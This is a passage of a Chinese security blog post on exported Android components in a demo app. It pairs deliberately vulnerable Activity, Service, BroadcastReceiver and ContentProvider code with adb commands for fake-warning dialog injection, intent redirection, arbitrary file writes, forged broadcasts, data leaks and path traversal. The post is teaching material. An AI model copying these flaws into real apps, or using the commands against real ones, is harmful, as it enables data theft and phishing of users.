  <entry>
    <title>四大组件</title>
    <link href="/2026/04/30/%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6/"/>
    <url>/2026/04/30/%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>​一个Android App由四大组件为核心构成。每个组件都可以选择是否导出（exported）</p><h2 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h2><p>​负责用户界面展示，一个屏幕页面对应一个Activity。（app的入口界面–&gt;MainActivity）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;activity<br>          android:name=<span class="hljs-string">&quot;com.demo.exportedcomponents.MainActivity&quot;</span><br>          android:exported=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>          &lt;intent-filter&gt;<br>              &lt;action android:name=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span>/&gt;<br>              &lt;category android:name=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;<br>          &lt;/intent-filter&gt;<br>      &lt;/activity&gt;<br></code></pre></td></tr></table></figure><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><h4 id="导出-Activity-未安全校验外部输入"><a href="#导出-Activity-未安全校验外部输入" class="headerlink" title="导出 Activity 未安全校验外部输入"></a>导出 Activity 未安全校验外部输入</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnDisplayActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> &#123;   <br>    <span class="hljs-meta">@Override</span>   <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        showDialog(getIntent());<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showDialog</span><span class="hljs-params">(Intent intent)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">title</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;title&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;message&quot;</span>);<br>        <span class="hljs-keyword">if</span> (title == <span class="hljs-literal">null</span>) title = <span class="hljs-string">&quot;通知&quot;</span>;<br>        <span class="hljs-keyword">if</span> (message == <span class="hljs-literal">null</span>) message = <span class="hljs-string">&quot;暂无内容&quot;</span>;<br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.Builder(<span class="hljs-built_in">this</span>)  <span class="hljs-comment">//创建系统弹窗，this表示当前Activity</span><br>            .setTitle(title)<br>            .setMessage(message)<br>            .setPositiveButton(<span class="hljs-string">&quot;确定&quot;</span>, (d, w) -&gt; finish())  <span class="hljs-comment">//添加一个“确定”按钮</span><br>            .setCancelable(<span class="hljs-literal">false</span>)  <span class="hljs-comment">//禁止返回键关闭</span><br>            .show();  <span class="hljs-comment">//真正把该弹窗显示（前面是配置）</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的Manifest声明</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;activity<br>    android:<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;.VulnDisplayActivity&quot;</span><br>    android:<span class="hljs-attribute">exported</span>=<span class="hljs-string">&quot;true&quot;</span><br>    android:<span class="hljs-attribute">label</span>=<span class="hljs-string">&quot;系统通知&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>.VulnDisplayActivity是导出的，任何APP都可以调用它，而其也没有对应的权限检验以及内容检验，所以导致我们可以随意调用这个组件并且输入内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">通过 ADB 注入伪造的<span class="hljs-string">&quot;安全警告&quot;</span>弹窗：<br>adb shell am start -n com<span class="hljs-selector-class">.demo</span>.exportedcomponents/<span class="hljs-selector-class">.VulnDisplayActivity</span> \<br>    <span class="hljs-attr">--es</span> title <span class="hljs-string">&quot;安全警告&quot;</span> \<br>    <span class="hljs-attr">--es</span> message <span class="hljs-string">&quot;您的账户存在异常登录，请立即修改密码&quot;</span><br></code></pre></td></tr></table></figure><p>成功显示</p><h4 id="Intent-重定向"><a href="#Intent-重定向" class="headerlink" title="Intent 重定向"></a>Intent 重定向</h4><p>即使Activity没有导出，但是一旦导出的Activity接收外部的Intent并且没有严格效验，那么就有可能从传入的恶意Intent打开内部未导出的Activity</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VulnRedirectActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Activity</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> void onCreate(<span class="hljs-type">Bundle</span> savedInstanceState) &#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br><br>        <span class="hljs-comment">// 方式 1：从 extras 取出嵌套 Intent</span><br>        <span class="hljs-type">Intent</span> nested = getIntent().getParcelableExtra(<span class="hljs-string">&quot;next_intent&quot;</span>);<br>        <span class="hljs-keyword">if</span> (nested != <span class="hljs-literal">null</span>) &#123;<br>            startActivity(nested);  <span class="hljs-comment">// 漏洞：直接启动攻击者提供的 Intent</span><br>            finish();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 方式 2：从字符串参数构造 Intent</span><br>        <span class="hljs-type">String</span> targetPkg = getIntent().getStringExtra(<span class="hljs-string">&quot;target_package&quot;</span>);<br>        <span class="hljs-type">String</span> targetCls = getIntent().getStringExtra(<span class="hljs-string">&quot;target_class&quot;</span>);<br>        <span class="hljs-keyword">if</span> (targetPkg != <span class="hljs-literal">null</span> &amp;&amp; targetCls != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">Intent</span> redirect = <span class="hljs-keyword">new</span> <span class="hljs-type">Intent</span>();<br>            redirect.setClassName(targetPkg, targetCls);<br>            startActivity(redirect);  <span class="hljs-comment">// 漏洞：根据外部输入构造 Intent 并启动</span><br>            finish();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>adb通过.VulnRedirectActivity启动未export的组件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">adb shell am start -n com<span class="hljs-selector-class">.demo</span>.exportedcomponents/<span class="hljs-selector-class">.VulnRedirectActivity</span> \<br>    <span class="hljs-attr">--es</span> target_package <span class="hljs-string">&quot;com.demo.exportedcomponents&quot;</span> \<br>    <span class="hljs-attr">--es</span> target_class <span class="hljs-string">&quot;com.demo.exportedcomponents.InternalSecretActivity&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/.io//image-20260430162632965.png" alt="image-20260430162632965"></p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>​负责后台服务，用于执行“后台任务”。</p><p>分为两类：</p><ul><li>Started Service（启动式）：后台独立运行，不依赖调用者</li><li>Bound Service（绑定式）：和调用者绑定在一起</li></ul><p>一旦该服务被外部App滥用，就可能导致危险</p><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><h4 id="未授权功能触发"><a href="#未授权功能触发" class="headerlink" title="未授权功能触发"></a>未授权功能触发</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Service</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">onStartCommand</span><span class="hljs-params">(Intent intent, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> startId)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;filename&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;content&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (filename != <span class="hljs-literal">null</span> &amp;&amp; content != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 漏洞：无调用者校验，直接根据外部输入写文件</span><br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(getFilesDir(), filename);<br>            <span class="hljs-type">FileWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(file);<br>            writer.write(content);<br>            writer.close();<br>        &#125;<br>        stopSelf();<br>        <span class="hljs-keyword">return</span> START_NOT_STICKY;<br>    &#125;<br>&#125;<br><br>Manifest 中无任何权限保护：<br>&lt;service<br>    android:name=<span class="hljs-string">&quot;.VulnService&quot;</span><br>    android:exported=<span class="hljs-string">&quot;true&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>adb向应用沙箱写入任意文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim"># 触发写入<br>adb <span class="hljs-keyword">shell</span> <span class="hljs-keyword">am</span> startservice -n <span class="hljs-keyword">com</span>.demo.exportedcomponents/.VulnService \<br>    --es filename <span class="hljs-string">&quot;config.txt&quot;</span> \<br>    --es content <span class="hljs-string">&quot;malicious_data_injected_by_attacker&quot;</span><br><br># 验证写入结果<br>adb <span class="hljs-keyword">shell</span> run-<span class="hljs-keyword">as</span> <span class="hljs-keyword">com</span>.demo.exportedcomponents \<br>    <span class="hljs-keyword">cat</span> /data/data/<span class="hljs-keyword">com</span>.demo.exportedcomponents/<span class="hljs-keyword">files</span>/config.txt<br></code></pre></td></tr></table></figure><p>​负责接收信息通知</p><p>两种注册方式：</p><ul><li>静态注册：写在AndroidManifest.xml，系统永久记住，即使APp没打开也能接收</li><li>动态注册：写在代码里，当前页面存活才能收到广播</li></ul><h3 id="漏洞-2"><a href="#漏洞-2" class="headerlink" title="漏洞"></a>漏洞</h3><p>大致可以分为：</p><table><thead><tr><th align="left">模式</th><th align="left">方向</th><th align="left">原理</th><th align="left">危害</th></tr></thead><tbody><tr><td align="left">广播注入</td><td align="left">攻击者到受害者</td><td align="left">向导出的 Receiver 发送伪造广播</td><td align="left">触发敏感逻辑</td></tr><tr><td align="left">广播劫持</td><td align="left">受害者到攻击者</td><td align="left">注册高优先级 Receiver 拦截有序广播</td><td align="left">数据窃取</td></tr><tr><td align="left">隐式广播窃听</td><td align="left">受害者到攻击者</td><td align="left">监听未设置包名的隐式广播</td><td align="left">信息泄露</td></tr></tbody></table><h4 id="广播注入"><a href="#广播注入" class="headerlink" title="广播注入"></a>广播注入</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BroadcastReceiver</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-comment">// 漏洞：直接信任外部广播中的数据</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;log_data&quot;</span>);<br>        <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">null</span>) &#123;<br>            Log.i(TAG, <span class="hljs-string">&quot;Received data: &quot;</span> + data);<br>            Toast.makeText(context,<br>                <span class="hljs-string">&quot;收到广播数据: &quot;</span> + data, Toast.LENGTH_LONG).show();<br>        &#125;<br>    &#125;<br>&#125;<br><br>Manifest 中声明了 intent-filter 且 exported=<span class="hljs-literal">true</span>：<br>&lt;receiver<br>    android:name=<span class="hljs-string">&quot;.VulnReceiver&quot;</span><br>    android:exported=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>    &lt;intent-filter&gt;<br>        &lt;action android:name=<span class="hljs-string">&quot;com.demo.exportedcomponents.ACTION_LOG&quot;</span> /&gt;<br>    &lt;/intent-filter&gt;<br>&lt;/receiver&gt;<br></code></pre></td></tr></table></figure><p>adb发送伪造广播：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">adb shell am broadcast -n com<span class="hljs-selector-class">.demo</span>.exportedcomponents/<span class="hljs-selector-class">.VulnReceiver</span> \<br>    -<span class="hljs-selector-tag">a</span> com<span class="hljs-selector-class">.demo</span><span class="hljs-selector-class">.exportedcomponents</span><span class="hljs-selector-class">.ACTION_LOG</span> \<br>    <span class="hljs-attr">--es</span> log_data <span class="hljs-string">&quot;injected_by_attacker&quot;</span><br></code></pre></td></tr></table></figure><p>检验接收</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">adb logcat -s VulnReceiver</span><br></code></pre></td></tr></table></figure><h2 id="ContentProvider"><a href="#ContentProvider" class="headerlink" title="ContentProvider"></a>ContentProvider</h2><p>​提供数据共享。外部APP想访问内部APP的数据必须通过ContentProvider来实现。</p><h3 id="漏洞-3"><a href="#漏洞-3" class="headerlink" title="漏洞"></a>漏洞</h3><h4 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h4><p>query() 无权限保护，直接返回敏感数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnProvider</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ContentProvider</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">AUTHORITY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.demo.exportedcomponents.provider&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">FILES</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">USERS</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">UriMatcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UriMatcher</span>(-<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        matcher.addURI(AUTHORITY, <span class="hljs-string">&quot;users&quot;</span>, <span class="hljs-number">1</span>);<br>        matcher.addURI(AUTHORITY, <span class="hljs-string">&quot;files/*&quot;</span>, <span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.content.ContentProvider</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">secret</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(getContext().getFilesDir(), <span class="hljs-string">&quot;secret_token.txt&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!secret.exists()) &#123;<br>                <span class="hljs-type">FileWriter</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(secret);<br>                w.write(<span class="hljs-string">&quot;demo_secret_token_12345&quot;</span>);<br>                w.close();<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.content.ContentProvider</span><br>    <span class="hljs-keyword">public</span> Cursor <span class="hljs-title function_">query</span><span class="hljs-params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span> &#123;<br>        <span class="hljs-keyword">if</span> (matcher.match(uri) == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-type">MatrixCursor</span> <span class="hljs-variable">cursor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MatrixCursor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;username&quot;</span>, NotificationCompat.CATEGORY_EMAIL, <span class="hljs-string">&quot;phone&quot;</span>&#125;);<br>            cursor.addRow(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;zhang_san&quot;</span>, <span class="hljs-string">&quot;zhangsan@example.com&quot;</span>, <span class="hljs-string">&quot;138xxxx1234&quot;</span>&#125;);<br>            cursor.addRow(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-number">2</span>, <span class="hljs-string">&quot;li_si&quot;</span>, <span class="hljs-string">&quot;lisi@example.com&quot;</span>, <span class="hljs-string">&quot;139xxxx5678&quot;</span>&#125;);<br>            cursor.addRow(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-number">3</span>, <span class="hljs-string">&quot;wang_wu&quot;</span>, <span class="hljs-string">&quot;wangwu@example.com&quot;</span>, <span class="hljs-string">&quot;137xxxx9012&quot;</span>&#125;);<br>            <span class="hljs-keyword">return</span> cursor;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.content.ContentProvider</span><br>    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">openFile</span><span class="hljs-params">(Uri uri, String mode)</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-keyword">if</span> (matcher.match(uri) == <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> uri.getLastPathSegment();<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(getContext().getFilesDir(), filename);<br>            <span class="hljs-keyword">return</span> ParcelFileDescriptor.open(file, <span class="hljs-number">268435456</span>);<br>        &#125;<br><br>        <br>        <br>&lt;provider<br>    android:name=<span class="hljs-string">&quot;.VulnProvider&quot;</span><br>    android:authorities=<span class="hljs-string">&quot;com.demo.exportedcomponents.provider&quot;</span><br>    android:exported=<span class="hljs-string">&quot;true&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>adb查询用户数据：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">adb shell <span class="hljs-attribute">content</span> query \<br>    <span class="hljs-attr">--uri</span> <span class="hljs-attribute">content</span>://com.demo.exportedcomponents.provider/users<br></code></pre></td></tr></table></figure><h4 id="路劲遍历"><a href="#路劲遍历" class="headerlink" title="路劲遍历"></a>路劲遍历</h4><p>没有过滤路劲遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// openFile 未过滤路径遍历</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">openFile</span><span class="hljs-params">(Uri uri, String mode)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> uri.getLastPathSegment();  <span class="hljs-comment">// 攻击者可控</span><br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(getContext().getFilesDir(), path);<br>    <span class="hljs-comment">// 如果 path = &quot;../../shared_prefs/secret.xml&quot;</span><br>    <span class="hljs-comment">// 就能读到沙箱内其他文件</span><br>    <span class="hljs-keyword">return</span> ParcelFileDescriptor.open(file,<br>        ParcelFileDescriptor.MODE_READ_ONLY);<br>&#125;<br></code></pre></td></tr></table></figure><p>adb读取文件</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">adb shell <span class="hljs-built_in">content</span> <span class="hljs-built_in">read</span> \<br>--uri <span class="hljs-built_in">content</span>://com.<span class="hljs-built_in">demo</span>.exportedcomponents.provider/files/secret_token.txt<br></code></pre></td></tr></table></figure><h2 id="导出机制"><a href="#导出机制" class="headerlink" title="导出机制"></a>导出机制</h2><h3 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 显式导出 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.PaymentActivity&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span><br><br><span class="hljs-comment">&lt;!-- 显式不导出 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.InternalSettingsActivity&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="隐式"><a href="#隐式" class="headerlink" title="隐式"></a>隐式</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 没写 exported，但声明了 intent-filter，Android 12 之前自动导出 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.ShareActivity&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.SEND&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br>（在Android 12之后，未申明 exported会报错）<br></code></pre></td></tr></table></figure><h2 id="权限保护机制"><a href="#权限保护机制" class="headerlink" title="权限保护机制"></a>权限保护机制</h2><p>在组件声明中指定权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;permission<br>    android:<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;com.example.permission.ACCESS_SENSITIVE&quot;</span><br>    android:<span class="hljs-attribute">protectionLevel</span>=<span class="hljs-string">&quot;signature&quot;</span> /&gt;<br>&lt;service<br>    android:<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;.SensitiveService&quot;</span><br>    android:<span class="hljs-attribute">exported</span>=<span class="hljs-string">&quot;true&quot;</span><br>    android:<span class="hljs-attribute">permission</span>=<span class="hljs-string">&quot;com.example.permission.ACCESS_SENSITIVE&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>调用方必须声明获得该权限，否则会抛出异常</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 